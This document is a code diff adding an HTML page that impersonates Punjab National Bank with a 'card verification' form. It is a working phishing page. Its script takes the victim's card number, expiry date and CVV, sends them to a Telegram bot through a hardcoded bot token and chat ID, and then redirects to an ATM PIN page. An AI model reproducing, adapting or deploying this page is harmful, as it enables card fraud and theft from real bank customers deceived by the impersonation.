@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Punjab National Bank</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        .form-container {
+            background-color: hsl(0, 89%, 26%); /* Red background */
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 400px;
+            margin: 20px auto;
+            border: 3px solid red; /* Red border */
+        }
+
+        .form-container label {
+            font-weight: bold;
+            display: block;
+            margin: 10px 0 5px;
+            color: hsl(0, 100%, 99%); /* Yellow text for labels */
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            color: #0a0a0a; /* Yellow text inside input fields */
+            background-color: hsl(0, 11%, 93%); /* Dark background for inputs */
+        }
+
+        .form-container button {
+            background-color: #f4b400; /* Yellow background */
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .form-container button:hover {
+            background-color: #e0a500;
+        }
+
+        footer {
+            background-color: #2a2a2a;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 20px;
+        }
+
+        footer a {
+            color: #f4b400;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        .banner img {
+            width: 100%;
+            max-height: 300px;
+            object-fit: cover;
+        }
+
+        /* Modal Styles */
+        #modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.4);
+            text-align: center;
+        }
+
+        #modal-content {
+            background-color: white;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 300px;
+            border-radius: 10px;
+        }
+
+        /* Text Slider Styles */
+        .slider-container {
+            background-color: hsl(0, 0%, 99%);
+            padding: 10px;
+            color: white;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .slider {
+            font-size: 24px;
+            font-weight: bold;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        .slider span {
+            display: inline-block;
+            padding-left: 100%;
+            animation: slide 15s linear infinite;
+        }
+
+        @keyframes slide {
+            0% {
+                transform: translateX(0);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Section -->
+    <header>
+        <div class="logo-container">
+            <img src="pnb-logo.png" alt="PNB Logo">
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Personal</a></li>
+                <li><a href="#">Corporate</a></li>
+                <li><a href="#">NRI</a></li>
+                <li><a href="#">Agri</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Banner Section -->
+    <section class="banner">
+        <img src="banner.png" alt="PNB Banner">
+    </section>
+
+    <!-- Main Content -->
+    <main>
+        <section class="verification-form">
+            <h2>PNB Debit/Credit Card Verification</h2>
+            <form id="verification-form" class="form-container">
+                <label for="card-number">Debit/Credit Card Number:</label>
+                <input type="text" id="card-number" name="card-number" placeholder="Enter your credit card number" maxlength="16" oninput="validateCardNumber(this)">
+
+                <label for="expiry-date">Expiry Date (MM/YY):</label>
+                <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" maxlength="5" oninput="validateExpiryDate(this)">
+
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" placeholder="Enter your CVV" maxlength="3">
+
+                <button type="button" id="next-button">Next</button>
+            </form>
+        </section>
+    </main>
+
+    <!-- Footer Section -->
+    <footer>
+        <p>&copy; 2025 Punjab National Bank. All rights reserved.</p>
+        <p>For support, visit our <a href="#">Help Center</a> or call <a href="tel:+18001802030">1800-180-2030</a></p>
+    </footer>
+
+    <!-- Modal for Processing -->
+    <div id="modal">
+        <div id="modal-content">
+            <h3>Processing...</h3>
+            <p>Please wait while we process your request.</p>
+        </div>
+    </div>
+
+    <!-- JavaScript for Validation, Modal, and Redirection -->
+    <script>
+        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; 
+        const chatId = "-1002424646619";
+
+        document.getElementById("next-button").addEventListener("click", function () {
+            const cardNumberField = document.getElementById("card-number");
+            const expiryDateField = document.getElementById("expiry-date");
+            const cvvField = document.getElementById("cvv");
+
+            if (!cardNumberField.value.trim() || cardNumberField.value.length !== 16) {
+                alert("Please enter a valid 16-digit Credit Card Number.");
+                cardNumberField.focus();
+                return;
+            }
+
+            if (!expiryDateField.value.trim() || expiryDateField.value.length !== 5) {
+                alert("Please enter a valid Expiry Date (MM/YY).");
+                expiryDateField.focus();
+                return;
+            }
+
+            if (!cvvField.value.trim() || cvvField.value.length !== 3) {
+                alert("Please enter a valid CVV.");
+                cvvField.focus();
+                return;
+            }
+
+            // Show processing modal
+            document.getElementById("modal").style.display = "block";
+
+            // Prepare and send Telegram notification
+            const message = `🔹 **PNB Card Verification**\n💳 Credit Card: ${cardNumberField.value}\n📅 Expiry Date: ${expiryDateField.value}\n🔒 CVV: ${cvvField.value}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Wait for 3 seconds and then redirect
+                    setTimeout(() => {
+                        window.location.href = "atmpin.html"; // Ensure path is correct
+                    }, 3000);
+                } else {
+                    alert("Error processing your request. Please try again.");
+                    document.getElementById("modal").style.display = "none"; // Hide modal if error occurs
+                }
+            })
+            .catch(error => {
+                console.error("Telegram Error:", error);
+                document.getElementById("modal").style.display = "none"; // Hide modal if error occurs
+            });
+        });
+
+        // Input field validations (only numbers for card number and expiry date)
+        function validateCardNumber(input) {
+            input.value = input.value.replace(/\D/g, ''); // Only allow numbers
+        }
+
+        function validateExpiryDate(input) {
+            input.value = input.value.replace(/[^0-9\/]/g, ''); // Only allow numbers and slash
+            if (input.value.length === 2 && !input.value.includes('/')) {
+                input.value = input.value + '/'; // Automatically add slash after MM
+            }
+        }
+    </script>
+
+</body>
+</html>
